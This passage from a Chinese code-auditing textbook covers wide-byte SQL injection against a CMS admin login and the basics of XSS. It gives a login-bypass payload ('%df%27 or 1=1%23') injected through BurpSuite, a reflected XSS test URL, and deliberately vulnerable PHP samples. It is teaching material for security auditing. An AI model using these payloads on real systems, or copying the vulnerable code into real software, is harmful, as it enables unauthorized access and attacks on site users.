\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image208.jpg)\r
\r
\u56FE3-19 admin_common_inc.php\u4EE3\u7801\u56FE\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image210.jpg)\r
\r
\u56FE3-20 admin_addslashes_deep\u51FD\u6570\u56FE\r
\r
\u4EE5\u7BA1\u7406\u5458\u767B\u5F55\u529F\u80FD\u4E3A\u6848\u4F8B\uFF0C\u6D4B\u8BD5\u7BA1\u7406\u5458\u767B\u5F55\u9875\u9762\u5BF9\u666E\u901A\u6CE8\u5165\u6F0F\u6D1E\u7684addslashes\u9632\u5FA1\u6548\u679C\u3002\u4F7F\u7528Seay\u6570\u636E\u76D1\u63A7\u5DE5\u5177\u6A21\u5757\u8FDB\u884C\u6A21\u7CCA\u6D4B\u8BD5SQL\u6CE8\u5165\u60C5\u51B5\u3002\u5F53\u7528\u6237\u540D\u8F93\u5165admin\u2019 or 1=1 #\u540E\uFF0C\u5BC6\u7801\u968F\u610F\u8F93\u5165\uFF0C\u70B9\u51FB\u767B\u5F55\u3002SQL\u6267\u884C\u60C5\u51B5\u5982\u56FE3-21\u6240\u793A\uFF0C\u56FE\u4E2D\u5355\u5F15\u53F7\u2019\u88AB\u6210\u529F\u8F6C\u79FB\u4E3A\\\u2019\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image212.jpg)\r
\r
\u56FE3-21 MySQL\u6267\u884C\u76D1\u63A7\u56FE\r
\r
l \u5B9A\u4F4D\u6F0F\u6D1E\r
\r
\`\`\`\r
\u5BBD\u5B57\u8282\u6CE8\u5165\u53EF\u4EE5\u7ED5\u8FC7addslashes\u51FD\u6570\u9632\u5FA1\uFF0C\u8BE5\u6F0F\u6D1E\u6761\u4EF6\u662F\u6570\u636E\u5E93\u8FDE\u63A5\u91C7\u7528GBK\u7F16\u7801\uFF0C\u56E0\u6B64\u5BF9\u8BE5CMS\u7F16\u7801\u60C5\u51B5\u8FDB\u884C\u5206\u6790\u3002\u901A\u8FC7\u5168\u5C40\u641C\u7D22\u51FD\u6570\u5305\u62EC\uFF1Amysql_set_charset\u3001mysql_query\u5173\u952E\u5B57\uFF0C\u5728\u6587\u4EF6mysql.class.php\u4E2D\u6570\u636E\u5E93\u8FDE\u63A5\u91C7\u7528GBK\u7F16\u7801\uFF0C\u5982\u56FE3-22\u6240\u793A\uFF0C\u8BE5CMS\u5B58\u5728\u5BBD\u5B57\u8282\u6CE8\u5165\u6F0F\u6D1E\u3002\r
\r
\u56FE3-22 \u6570\u636E\u5E93\u8BBE\u7F6EGBK\u7F16\u7801\u56FE\r
\`\`\`\r
\r
\u5BF9\u4E8E\u8BE5CMS\u7BA1\u7406\u5458\u767B\u5F55\u529F\u80FD\u800C\u8A00\uFF0C\u5176\u903B\u8F91\u4EE3\u7801\u6587\u4EF6\u4E3Aadmin_login.php\uFF0C\u9700\u8981\u5BF9\u8BE5\u6587\u4EF6\u8FDB\u884C\u5BA1\u8BA1\u4E86\u89E3\u7A0B\u5E8F\u6267\u884C\u6D41\u7A0B\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image216.jpg)\r
\r
\u56FE3-23 admin_login.php\u6587\u4EF6\u56FE\r
\r
\u5982\u56FE3-23\u6240\u793A\uFF0C\u7A0B\u5E8F\u9996\u5148\u5B9A\u4E49\u5E38\u91CF\u201CIN_QISHI\u201D\u4E3A\u201Ctrue\u201D\u5E76\u5305\u542Bconfig.php\u548Cadmin_common.inc.php\u6587\u4EF6\u3002config.php\u6587\u4EF6\u7528\u4E8E\u6570\u636E\u5E93\u914D\u7F6E\uFF0Cadmin_common.inc.php\u6587\u4EF6\u7528\u4E8E\u8FDE\u63A5\u6570\u636E\u5E93\u5E76\u8FC7\u6EE4GET\u3001POST\u3001COOKIE\u3001REQUEST\u7684\u4F20\u9012\u6570\u636E\u3002\r
\r
\u7136\u540E\uFF0C\u901A\u8FC7$_REQUEST[\u2018act\u2019]\u83B7\u53D6HTTP\u8BF7\u6C42\u4F20\u9012\u6570\u636E\u5E76\u8D4B\u503C\u7ED9\u53D8\u91CF$act\u3002\u5BF9$act\u5185\u5BB9\u8FDB\u884C\u5224\u65AD\uFF0C\u82E5\u767B\u5F55\u53C2\u6570\u4E3Ado_login\uFF0C\u5219\u8FDB\u884C\u767B\u5F55\u5224\u65AD\u3002\u8C03\u7528check_word\u51FD\u6570\u68C0\u67E5\u9A8C\u8BC1\u7801\u7684\u6B63\u786E\u6027\uFF0C\u968F\u540E\u8C03\u7528check_admin\u51FD\u6570\u68C0\u67E5\u7528\u6237\u540D\u5BC6\u7801\uFF0C\u5982\u679C\u7528\u6237\u540D\u5BC6\u7801\u6B63\u786E\u5C31\u66F4\u65B0\u7BA1\u7406\u5458\u4FE1\u606F\uFF0C\u5E76\u4E3A\u7528\u6237\u8BBE\u7F6ECookie\u4FE1\u606F\u3002\u5176\u4E2D\u6BD4\u8F83\u91CD\u8981\u7684\u662Fcheck_admin\u51FD\u6570\uFF0C\u53EA\u6709\u8BE5\u51FD\u6570\u901A\u8FC7\u624D\u80FD\u201C\u6210\u529F\u767B\u5F55\u201D\u3002\r
\r
check_admin\u4EE3\u7801\u5982\u56FE3-24\u6240\u793A\uFF0C\u8C03\u7528get_admin_one\u51FD\u6570\u6267\u884CSQL\u8BED\u53E5\u67E5\u8BE2\u7528\u6237\u540D\u662F\u5426\u5B58\u5728\uFF0C\u7136\u540E\u5BF9\u5BC6\u7801\u8FDB\u884Cmd5\u52A0\u5BC6\u64CD\u4F5C\u3002\u901A\u8FC7\u7528\u6237\u540D$name\u548C\u52A0\u5BC6\u540E\u5BC6\u7801$md5_pwd\u6267\u884CSQL\u8BED\u53E5\u67E5\u8BE2\u7528\u6237\u662F\u5426\u5B58\u5728\u3002\u8BE5SQL\u8BED\u53E5\u901A\u8FC7\u5355\u5F15\u53F7\u4FDD\u62A4\u4E3A\u5B57\u7B26\u578BSQL\u6CE8\u5165\uFF0C\u540C\u65F6\u53C2\u6570$name\u4F7F\u7528addslashes\u8FC7\u6EE4\u3002\u4F46\u7531\u4E8E\u6570\u636E\u5E93\u8FDE\u63A5\u4F7F\u7528GBK\u7F16\u7801\uFF0C\u56E0\u6B64\u5B58\u5728\u5BBD\u5B57\u8282\u6CE8\u5165\u6F0F\u6D1E\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image218.jpg)\r
\r
\u56FE3-24 check_admin\u4EE3\u7801\u56FE\r
\r
\uFF082\uFF09\u6D4B\u8BD5\u5229\u7528\u9636\u6BB5\r
\r
\u767B\u5F55\u754C\u9762\u4E3APOST\u65B9\u6CD5\u4F20\u9012\u53C2\u6570\uFF0C\u4F7F\u7528BurpSuit\u8FDB\u884C\u6570\u636E\u5305\u62E6\u622A\uFF0C\u9875\u9762\u5982\u56FE3-25\u6240\u793A\u3002\r
\r
![\u56FE\u72477](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image220.gif)\r
\r
\u56FE3-25 \u767B\u5F55\u9875\u9762\u56FE\r
\r
\u5728admin_login.php\u9875\u9762\u4E0A\u8F93\u5165\u7528\u6237\u540Dadmin\u548C\u4EFB\u610F\u5BC6\u7801\uFF0C\u8F93\u5165\u6B63\u786E\u7684\u9A8C\u8BC1\u7801\uFF0CBurpSuite\u62E6\u622A\u5230\u6570\u636E\u5305\u540E\uFF0C\u5728admin_name\u5B57\u6BB5\u7684\u672B\u5C3E\u52A0\u4E0A%df%27 or 1=1%23\uFF0C\u518D\u70B9\u51FBForward\u6309\u94AE\uFF0C\u4F7F\u7528\u5BBD\u5B57\u8282SQL\u6CE8\u5165\u7684\u65B9\u5F0F\u5F62\u6210\u4E07\u80FD\u5BC6\u7801\u767B\u5F55\u3002\u4FEE\u6539BurpSuite\u62E6\u622A\u6570\u636E\u7684\u6570\u636E\u5305\u5982\u56FE3-26\u6240\u793A\u3002\r
\r
\u5C06\u8FDE\u63A5\u6570\u636E\u5305\u5168\u90E8\u8F6C\u53D1\u540E\uFF0C\u67E5\u770B\u9875\u9762\u663E\u793A\u60C5\u51B5\uFF0C\u53D1\u73B0\u5DF2\u7ECF\u6210\u529F\u767B\u5F55CMS\u540E\u53F0\u7BA1\u7406\u5458\u7CFB\u7EDF\uFF0C\u5982\u56FE3-27\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image222.jpg)\r
\r
\u56FE3-26 \u767B\u5F55\u6570\u636E\u5305\u62E6\u622A\u56FE\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image224.jpg)\r
\r
\u56FE3-27 \u767B\u5F55\u6210\u529F\u56FE\r
\r
## 3.6 \u5355\u5143\u5C0F\u7ED3\r
\r
\u672C\u5355\u5143\u4E3B\u8981\u5B66\u4E60\u4EE3\u7801\u5BA1\u8BA1\u4E2D\u7684SQL\u6CE8\u5165\u6F0F\u6D1E\u3002\u901A\u8FC7\u5BF9SQL\u6CE8\u5165\u6F0F\u6D1E\u4ECB\u7ECD\uFF0C\u4F7F\u8BFB\u8005\u719F\u6089\u5BA1\u8BA1SQL\u6CE8\u5165\u6F0F\u6D1E\u7684\u65B9\u5F0F\u53CA\u65B9\u6CD5\u3002\u9700\u7740\u91CD\u638C\u63E1\u5404\u7C7BSQL\u6CE8\u5165\u6F0F\u6D1E\u7684PHP\u4EE3\u7801\u5F62\u5F0F\u3001\u6F0F\u6D1E\u539F\u7406\u3001\u5229\u7528\u65B9\u6CD5\u3001\u5BA1\u8BA1\u65B9\u6CD5\u3001\u9632\u5FA1\u65B9\u6CD5\u7B49\uFF0C\u540C\u65F6\u80FD\u591F\u4F7F\u7528Seay\u5DE5\u5177\u5BF9CMS\u4E2D\u7684SQL\u6267\u884C\u8FDB\u884C\u6A21\u7CCA\u6D4B\u8BD5\u3002\r
\r
\r
\r
 \r
\r
# \u5355\u51434 XSS\u6F0F\u6D1E\u5BA1\u8BA1\r
\r
\u672C\u5355\u5143\u4ECB\u7ECD\u4E86\u4EE3\u7801\u5BA1\u8BA1\u4E2DXSS\u6F0F\u6D1E\uFF0C\u5176\u4E3B\u8981\u5206\u4E3A\u56DB\u4E2A\u90E8\u5206\u8FDB\u884C\u4ECB\u7ECD\u3002\r
\r
\u7B2C\u4E00\u90E8\u5206\u4E3B\u8981\u4ECB\u7ECDXSS\u6F0F\u6D1E\u7684\u57FA\u7840\u77E5\u8BC6\uFF0C\u5305\u62EC\uFF1AXSS\u6F0F\u6D1E\u7B80\u4ECB\u3001XSS\u6F0F\u6D1E\u7684\u6316\u6398\u7ECF\u9A8C\u3002\r
\r
\u7B2C\u4E8C\u90E8\u5206\u4ECB\u7ECDXSS\u6F0F\u6D1E\u7684\u5206\u7C7B\uFF0C\u5305\u62EC\uFF1A\u53CD\u5C04\u578BXSS\u6F0F\u6D1E\u3001\u5B58\u50A8\u578BXSS\u6F0F\u6D1E\u3001DOM\u578BXSS\u6F0F\u6D1E\u7684\u6982\u5FF5\u53CA\u4EE3\u7801\u6848\u4F8B\u3002\r
\r
\u7B2C\u4E09\u90E8\u5206\u4ECB\u7ECDXSS\u6F0F\u6D1E\u7684\u5E38\u89C1\u9632\u5FA1\u673A\u5236\uFF0C\u4EE5\u53CA\u5E38\u89C1\u7684\u7ED5\u8FC7XSS\u6F0F\u6D1E\u7684\u65B9\u6CD5\uFF0C\u5305\u62EC\uFF1A\u7F16\u89E3\u7801\u7ED5\u8FC7\u3001HTML\u7F16\u5199\u4E0D\u89C4\u8303\u3001\u9ED1\u540D\u5355\u7ED5\u8FC7\u3001\u5BBD\u5B57\u8282\u6CE8\u5165\u3002\r
\r
\u7B2C\u56DB\u90E8\u5206\u4F7F\u7528BlueCMS\u53CA74CMS\u4E3A\u5B9E\u9A8C\uFF0C\u901A\u8FC7\u4EE3\u7801\u5BA1\u8BA1XSS\u6F0F\u6D1E\u6316\u6398\u8BE5CMS\u4E2D\u7684\u5B89\u5168\u6F0F\u6D1E\u3002\r
\r
**\u5355\u5143\u6784\u56FE\uFF1A**\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image226.jpg)\r
\r
**\u5355\u5143\u76EE\u6807\uFF1A**\r
\r
\\1. \u719F\u6089XSS\u6F0F\u6D1E\u7684\u6982\u5FF5\u53CA\u5206\u7C7B\uFF1B\r
\r
\\2. \u4E86\u89E3XSS\u6F0F\u6D1E\u7684\u6316\u6398\u6280\u5DE7\uFF1B\r
\r
\\3. \u638C\u63E1XSS\u6F0F\u6D1E\u7684\u5E38\u89C1\u4EE3\u7801\u5BA1\u8BA1\u65B9\u6CD5\uFF1B\r
\r
\\4. \u638C\u63E1XSS\u6F0F\u6D1E\u7684\u9632\u5FA1\u65B9\u6CD5\u3002\r
\r
## 4.1 XSS\u6F0F\u6D1E\u6316\u6398\r
\r
### 4.1.1 XSS\u6F0F\u6D1E\u7B80\u4ECB\r
\r
XSS\uFF08Cross-Site Scripting\uFF09\u6F0F\u6D1E\u662FWeb\u5E94\u7528\u7A0B\u5E8F\u4E2D\u6700\u5E38\u89C1\u7684\u6F0F\u6D1E\u4E4B\u4E00\uFF0C\u5176\u540D\u4E3A\u8DE8\u7AD9\u811A\u672C\u653B\u51FB\u3002\u8BE5\u6F0F\u6D1E\u51FA\u73B0\u7684\u4E3B\u8981\u539F\u56E0\u662F\u7F51\u7AD9\u8BBE\u8BA1\u7A0B\u5E8F\u5BF9\u7528\u6237\u8F93\u5165\u5185\u5BB9\u8FC7\u6EE4\u5B58\u5728\u7F3A\u9677\uFF0C\u5BFC\u81F4\u7F51\u7AD9\u9875\u9762\u7BE1\u6539\u6216\u811A\u672C\u690D\u5165\u3002\u653B\u51FB\u8005\u5411Web\u5E94\u7528\u4E2D\u5D4C\u5165\u63D0\u524D\u8BBE\u8BA1\u597D\u7684\u6076\u610FJavaScript\uFF08JS\uFF09\u811A\u672C\uFF0C\u4F7F\u5F97\u5176\u4ED6\u7528\u6237\u5728\u6D4F\u89C8\u8BE5\u7F51\u7AD9\u7A0B\u5E8F\u65F6\u6D4F\u89C8\u5668\u81EA\u52A8\u6267\u884C\u4E86\u6076\u610F\u7684JS\u811A\u672C\u5E76\u53D7\u5230\u653B\u51FB\u3002\r
\r
XSS\u6F0F\u6D1E\u653B\u51FB\u65B9\u5F0F\u6309\u7167\u5BF9\u8C61\u5206\u4E3A\u4E24\u7C7B\uFF1A\u9488\u5BF9\u7528\u6237\u3001\u9488\u5BF9Web\u670D\u52A1\u5668\u3002\u5BF9\u4E8E\u7528\u6237\u6765\u8BF4\u5E38\u89C1\u7684\u6709\uFF1A\u83B7\u5F97\u7528\u6237\u7684\u4FE1\u606F\uFF08\u4F1A\u8BDD\u548CCookie\u7B49\u5404\u79CD\u8EAB\u4EFD\u5185\u5BB9\uFF09\uFF0C\u4E3A\u5176\u4ED6\u7528\u6237\u7684\u5BA2\u6237\u7AEF\u690D\u5165\u6728\u9A6C\u3001\u5E7F\u544A\u5237\u6D41\u91CF\u3001\u7F51\u7EDC\u9493\u9C7C\u3002\u5BF9\u4E8EWeb\u670D\u52A1\u5668\u6765\u8BF4\u5E38\u89C1\u7684\u6709\uFF1A\u83B7\u5F97\u670D\u52A1\u5668\u66F4\u9AD8\u7684\u6267\u884C\u6743\u9650\u3001\u7BE1\u6539\u9875\u9762\u3001\u4F20\u64AD\u8815\u866B\u7B49\uFF0C\u56FE4-1\u4E3AXSS\u7684\u653B\u51FB\u65B9\u5F0F\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image228.jpg)\r
\r
\u56FE4-1 XSS\u653B\u51FB\u65B9\u5F0F\r
\r
\u5728\u5B9E\u9645\u7684\u5E94\u7528\u573A\u666F\u4E2D\uFF0CXSS\u6F0F\u6D1E\u53EF\u4EE5\u8BF4\u662F\u65E0\u5B54\u4E0D\u5165\uFF0C\u7F51\u7AD9\u7A0B\u5E8F\u8BBE\u8BA1\u8005\u7684\u4E00\u4E2A\u5C0F\u758F\u5FFD\u5C31\u5C06\u5F15\u8D77XSS\u6F0F\u6D1E\u3002\u8BE5\u6F0F\u6D1E\u5F80\u5F80\u51FA\u73B0\u5728\u7528\u6237\u8F93\u5165\u4F4D\u7F6E\uFF0C\u4F8B\u5982\uFF1A\u7F51\u7AD9\u8BC4\u8BBA\u533A\u3001\u7559\u8A00\u677F\u3001\u641C\u7D22\u6846\u7B49\u3002\r
\r
### 4.1.2 XSS\u6F0F\u6D1E\u6316\u6398\u7ECF\u9A8C\r
\r
\u5728\u4EE3\u7801\u5BA1\u8BA1\u8FC7\u7A0B\u4E2D\uFF0C\u76F8\u6BD4SQL\u6CE8\u5165\u6F0F\u6D1E\u800C\u8A00\uFF0CXSS\u6F0F\u6D1E\u8981\u66F4\u52A0\u96BE\u4EE5\u9632\u5FA1\u3002\u8BE5\u6F0F\u6D1E\u4E0E\u6D4F\u89C8\u5668\u73AF\u5883\u5173\u7CFB\u5F88\u5927\uFF0C\u5176\u9700\u8981\u4E86\u89E3\u6D4F\u89C8\u5668\u7684\u5BB9\u9519\u6027\u3001\u7F16\u7801\u3001\u6570\u636E\u534F\u8BAE\u7B49\u77E5\u8BC6\u3002\u4F46\u662FXSS\u6F0F\u6D1E\u7684\u5BA1\u8BA1\u8FD8\u662F\u6709\u4E00\u5B9A\u89C4\u5F8B\u53EF\u5FAA\u7684\uFF0C\u53EF\u4EE5\u8BF4\u6240\u6709\u7528\u6237\u53EF\u63A7\u4E14\u80FD\u8F93\u51FA\u5230\u9875\u9762\u7684\u4EE3\u7801\u4E2D\u90FD\u6709\u53EF\u80FD\u5B58\u5728XSS\u6F0F\u6D1E\uFF0C\u5305\u62EC\uFF1AURL\u4E2D\u7684\u53C2\u6570\u3001HTML\u7684\u8868\u5355\u7B49\u3002\u4E0B\u9762\u5C06\u4ECB\u7ECDXSS\u6F0F\u6D1E\u5BA1\u8BA1\u7684\u5E38\u89C1\u601D\u8DEF\u3002\r
\r
\uFF081\uFF09  \u6839\u636E\u529F\u80FD\u70B9\u5206\u6790\u4F20\u53C2\u6570\u636E\u6D41\r
\r
\u6309\u529F\u80FD\u8FDB\u884C\u5BA1\u8BA1\uFF0CXSS\u6F0F\u6D1E\u53EF\u80FD\u51FA\u73B0\u7684\u4E1A\u52A1\u573A\u666F\u5305\u62EC\uFF1A\u8BC4\u8BBA\u533A\u3001\u7559\u8A00\u533A\u3001\u4E2A\u4EBA\u4FE1\u606F\u3001\u8BA2\u5355\u4FE1\u606F\u3001\u641C\u7D22\u6846\u3001\u56FE\u7247\u5C5E\u6027\u7B49\u3002\r
\r
\u5176\u9700\u8981\u8003\u8651\u7684\u5185\u5BB9\u5982\u4E0B\uFF1A\r
\r
  \u5BA1\u8BA1\u4EE3\u7801\u4E2D\u654F\u611F\u529F\u80FD\u70B9\u4F20\u53C2\u4ECE\u524D\u53F0\u4EE3\u7801\u5230\u540E\u53F0\u518D\u5230\u56DE\u663E\u7684\u4E1A\u52A1\u4EE3\u7801\u6D41\u7A0B\u3002\r
\r
  \u5BA1\u8BA1\u5168\u5C40\u8FC7\u6EE4\u51FD\u6570\u5B9E\u73B0\u65B9\u6CD5\u3002\r
\r
  \u5BA1\u8BA1\u524D\u53F0JS\u53CA\u540E\u53F0PHP\u4EE3\u7801\u5BF9\u53C2\u6570\u7684\u8FC7\u6EE4\u60C5\u51B5\u3002\r
\r
  \u5BA1\u8BA1\u6570\u636E\u5E93\u5BF9\u53EF\u63A7\u5B57\u6BB5\u7684\u957F\u5EA6\u9650\u5236\u60C5\u51B5\uFF08\u9488\u5BF9\u4E8E\u5B58\u50A8\u578BXSS\uFF09\u3002\r
\r
  \u5BA1\u8BA1\u6570\u636E\u4ECE\u540E\u53F0\u663E\u793A\u5230\u524D\u53F0\u9875\u9762\u8FC7\u7A0B\u7684\u8FC7\u6EE4\u60C5\u51B5\u3002\r
\r
\uFF082\uFF09  \u6839\u636E\u540E\u53F0PHP\u63A5\u6536\u8BF7\u6C42\u53C2\u6570\u5206\u6790\r
\r
PHP\u4E2D\u5E38\u89C1\u63A5\u6536\u53C2\u6570\u65B9\u5F0F\u5305\u62EC\uFF1A$_GET\u3001$_POST\u3001$_REQUEST\u7B49\u3002\u901A\u8FC7\u5173\u952E\u5B57\u641C\u7D22\u63A5\u6536\u53C2\u6570\u4EE3\u7801\uFF0C\u82E5\u7A0B\u5E8F\u5C06\u53C2\u6570\u503C\u663E\u793A\u5230\u524D\u53F0\u9875\u9762\uFF0C\u4E14\u672A\u5BF9\u53C2\u6570\u8FDB\u884CHTML\u7F16\u7801\u8FC7\u6EE4\uFF0C\u5219\u5B58\u5728XSS\u6F0F\u6D1E\u3002\r
\r
\uFF083\uFF09  \u6839\u636E\u8F93\u51FA\u51FD\u6570\u5206\u6790\r
\r
\u5168\u5C40\u641C\u7D22\u540E\u53F0\u4EE3\u7801\u4E2D\u7684\u5E38\u89C1\u8F93\u51FA\u51FD\u6570\uFF1Aprint\u3001print_r\u3001echo\u3001printf\u3001sprintf\u3001die\u3001var_dump\u3001var_export\u7B49\uFF0C\u67E5\u770B\u8FD9\u4E9B\u51FD\u6570\u6253\u5370\u60C5\u51B5\u53CA\u662F\u5426\u53C2\u6570\u5B58\u5728\u8FC7\u6EE4\u60C5\u51B5\u3002DOM\u578BXSS\u5219\u9700\u8981\u5168\u5C40\u641C\u7D22JS\u64CD\u4F5CDOM\u5143\u7D20\u7684\u5173\u952E\u5B57\uFF0C\u4F8B\u5982\uFF1AgetElementById(id)\u3001appendChild(node)\u3001removeChild(node)\u3001innerHTML\u3001parentNode\u3001childNodes\u3001attributes\u7B49\u3002\r
\r
## 4.2 XSS\u6F0F\u6D1E\u5206\u7C7B\r
\r
\u6839\u636E\u6076\u610F\u7528\u6237\u4F7F\u7528\u7684XSS\u6F0F\u6D1E\u653B\u51FB\u8F7D\u8377\u7684\u5B58\u50A8\u4F4D\u7F6E\u8FDB\u884C\u533A\u5206\uFF0C\u5C06XSS\u6F0F\u6D1E\u5206\u4E3A\u4E09\u79CD\u7C7B\u578B\uFF0C\u5206\u522B\u662F\uFF1A\u53CD\u5C04\u578BXSS\u6F0F\u6D1E\u3001\u5B58\u50A8\u578BXSS\u6F0F\u6D1E\u548CDOM\u578BXSS\u6F0F\u6D1E\u3002\r
\r
### 4.2.1 \u53CD\u5C04\u578BXSS\u6F0F\u6D1E\r
\r
\u53CD\u5C04\u578BXSS\u6F0F\u6D1E\u53C8\u540D\u4E3A\u975E\u6301\u4E45\u578BXSS\u6F0F\u6D1E\uFF0C\u8BE5\u6F0F\u6D1E\u51FA\u73B0\u7684\u539F\u56E0\u4E3B\u8981\u662F\u5BF9\u7528\u6237\u901A\u8FC7URL\u5F62\u5F0F\u4F20\u9012\u7684\u53C2\u6570\u672A\u8FDB\u884C\u5B89\u5168\u8FC7\u6EE4\u5C31\u5728\u6D4F\u89C8\u5668\u8FDB\u884C\u89E3\u6790\u8F93\u51FA\uFF0C\u4ECE\u800C\u4F7F\u5F97\u7528\u6237\u6D4F\u89C8\u5668\u5728\u8F93\u51FA\u6B63\u5E38\u6570\u636E\u7684\u540C\u65F6\uFF0C\u8FD8\u6267\u884C\u4E86\u6076\u610F\u4EE3\u7801\u7A0B\u5E8F\u3002\r
\r
\uFF081\uFF09  \u65E0\u8FC7\u6EE4\u53CD\u5C04\u578BXSS\u4EE3\u7801\u6848\u4F8B\uFF1A\r
\r
\r
\r
<?php \r
\r
ini_set("display_errors", 0);\r
\r
$str = $_GET["name"];\r
\r
echo "<h2 align=center>\u6B22\u8FCE\u7528\u6237".$str."</h2>";\r
\r
?>\r
\r
\r
\r
\uFF082\uFF09  \u5206\u6790\u6F0F\u6D1E\uFF1A\r
\r
\u4F7F\u7528HTTP\u7684GET\u65B9\u5F0F\u4F20\u9012\u53C2\u6570name\uFF0C\u4E14\u8BE5\u53C2\u6570\u672A\u8FDB\u884C\u8FC7\u6EE4\u3002\u53EF\u901A\u8FC7name\u53D8\u91CF\u653E\u5165XSS\u811A\u672C\uFF0C\u5F53\u811A\u672C\u663E\u793A\u5230HTML\u65F6\uFF0C\u6D4F\u89C8\u5668\u54CD\u5E94\u5E76\u6267\u884CXSS\u811A\u672C\u3002\r
\r
\uFF083\uFF09  \u5229\u7528\u65B9\u6CD5\uFF1A\r
\r
  \u6784\u9020\u7684Payload\u5982\u4E0B\uFF1A\r
\r
\r
\r
http://192.168.0.11/level.php?name=<script>alert(\u201Cxss\u201D)<\/script>\r
\r
\r
\r
\u6D4B\u8BD5\u7ED3\u679C\u5982\u56FE4-2\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image230.jpg)\r
\r
\u56FE4-2 \u53CD\u5C04\u578BXSS\u653B\u51FB\u6D4B\u8BD5\u56FE\r
\r
### 4.2.3 \u5B58\u50A8\u578BXSS\u6F0F\u6D1E\r
\r
\u5B58\u50A8\u578BXSS\u6F0F\u6D1E\u53C8\u540D\u4E3A\u6301\u4E45\u578BXSS\u6F0F\u6D1E\uFF0C\u8BE5\u6F0F\u6D1E\u51FA\u73B0\u7684\u539F\u56E0\u662F\u5BF9\u7528\u6237\u8F93\u5165\u4FE1\u606F\u6570\u636E\u672A\u8FDB\u884C\u5B89\u5168\u8FC7\u6EE4\uFF0C\u4ECE\u800C\u4F7F\u5F97\u7528\u6237\u8F93\u5165\u7684\u6076\u610F\u811A\u672C\u4FDD\u5B58\u5230\u4E86\u670D\u52A1\u5668\u7684\u6570\u636E\u5E93\u6216\u6587\u4EF6\u4E2D\u3002\u5F53\u7528\u6237\u8BBF\u95EE\u7F51\u7AD9\u7279\u5B9A\u7F51\u9875\u65F6\uFF0C\u7531\u4E8E\u7F51\u9875\u8C03\u7528\u6570\u636E\u5E93\u4E2D\u7684\u4FE1\u606F\u5E76\u5C55\u793A\uFF0C\u4ECE\u800C\u89E6\u53D1\u4E86\u88AB\u4FDD\u5B58\u7684\u6076\u610F\u811A\u672C\u3002\u8BE5\u6F0F\u6D1E\u53EA\u8981\u7528\u6237\u8BBF\u95EE\u4E86\u88AB\u653B\u51FB\u7684\u7F51\u9875\uFF0C\u5C31\u4F1A\u89E6\u53D1\u653B\u51FB\u6548\u679C\u3002\r
\r
\uFF081\uFF09  \u65E0\u8FC7\u6EE4\u5B58\u50A8\u578BXSS\u7684\u5BA1\u8BA1\u4EE3\u7801\u6848\u4F8B\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php\r
\r
if( isset( $_POST[ **'btnSign'** ] ) ) {\r
\r
  $message = trim( $_POST[ **'mtxMessage'** ] );//\u5BF9\u53C2\u6570mtxMessage\u9996\u5C3E\u53BB\u7A7A\u683C\r
\r
  $name = trim( $_POST[ **'txtName'** ] ); //\u5BF9\u53C2\u6570txtName\u9996\u5C3E\u53BB\u7A7A\u683C\r
\r
  $message = stripslashes( $message );//\u5220\u9664\u53D8\u91CF$message\u4E2D\u7684\u53CD\u659C\u6760\\\r
\r
  $message = mysql_real_escape_string( $message );// \u5BF9\u53D8\u91CF$message\u8FDB\u884C\u8FC7\u6EE4\u9632\u5FA1SQL\u6CE8\u5165\u6F0F\u6D1E\r
\r
  $name = mysql_real_escape_string( $name ); // \u5BF9\u53D8\u91CF$ name\u8FDB\u884C\u8FC7\u6EE4\u9632\u5FA1SQL\u6CE8\u5165\u6F0F\u6D1E\r
\r
  **$query = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";//SQL****\u8BED\u53E5\uFF0C\u5411\u6570\u636E\u5E93guestbook\u4E2D\u63D2\u5165\u6570\u636E**\r
\r
  **$result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );**}?>//\u6267\u884C\u63D2\u5165\u6570\u636E\u7684SQL\u8BED\u53E5\u6216\u6253\u5370\u6570\u636E\u5E93\u9519\u8BEF\r
\r
\r
\r
\u524D\u53F0\u663E\u793A\u9875\u9762\u51FD\u6570\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
function dvwaGuestbook() {\r
\r
  $query = "SELECT name, comment FROM guestbook";//\u67E5\u8BE2guestbook\u6570\u636E\u5E93\u6570\u636ESQL\u8BED\u53E5\r
\r
  $result = mysql_query( $query );//\u6267\u884C\u67E5\u8BE2\u6570\u636ESQL\u8BED\u53E5\r
\r
  $guestbook = '';\r
\r
  while( $row = mysql_fetch_row( $result ) ) {\r
\r
\u200B    **$name  = $row[0];**\r
\r
\u200B    **$comment = $row[1];**\r
\r
\u200B    **$guestbook .= "<div id=\\"guestbook_comments\\">Name: {$name}<br />" . "Message: {$comment}<br /></div>\\n";//\u5C06\u6570\u636E\u5E93\u6570\u636E\u9010\u6761\u663E\u793A\u5230\u524D\u53F0\u9875\u9762**\r
\r
  }return $guestbook;}\r
\r
\r
\r
\uFF082\uFF09  \u5206\u6790\u6F0F\u6D1E\uFF1A\r
\r
